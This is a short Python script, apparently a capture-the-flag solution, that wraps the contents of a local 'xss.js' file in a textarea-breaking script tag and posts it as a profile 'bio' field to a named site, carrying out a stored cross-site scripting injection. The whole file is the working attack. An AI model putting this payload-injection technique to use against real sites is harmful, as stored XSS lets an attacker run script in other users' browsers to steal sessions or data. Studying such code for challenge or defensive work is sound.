#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from requests import post

template = """"></textarea>
<script>
{}
</script>
<textarea id=" """

f = open("xss.js", "r").read()
xss = template.format(f)
print(xss)
post("https://nosedive.hackmirror.icu/u/dratini0_a29d3e", data={"bio": xss})
